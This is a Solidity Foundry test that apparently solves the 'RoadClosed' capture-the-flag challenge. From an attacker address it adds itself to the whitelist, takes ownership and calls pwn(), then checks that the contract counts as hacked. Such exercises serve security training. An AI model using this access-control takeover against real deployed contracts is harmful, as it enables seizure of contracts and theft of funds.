// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/RoadClosed/RoadClosed.sol";

contract RoadAttackerSimple is Test {
    RoadClosed internal roadClosed;
    address attacker;

    function setUp() public {
        roadClosed = new RoadClosed();
        attacker = makeAddr("attacker");
        vm.label(attacker, "Attacker");
        assertEq(roadClosed.isHacked(), false);
    }

    function testAttack() public {
        vm.startPrank(attacker);
        roadClosed.addToWhitelist(attacker);
        roadClosed.changeOwner(attacker);
        roadClosed.pwn(attacker);

        assertEq(roadClosed.isHacked(), true);
        console.log(unicode"\n Exploit successful 😾!!!!");
    }
}
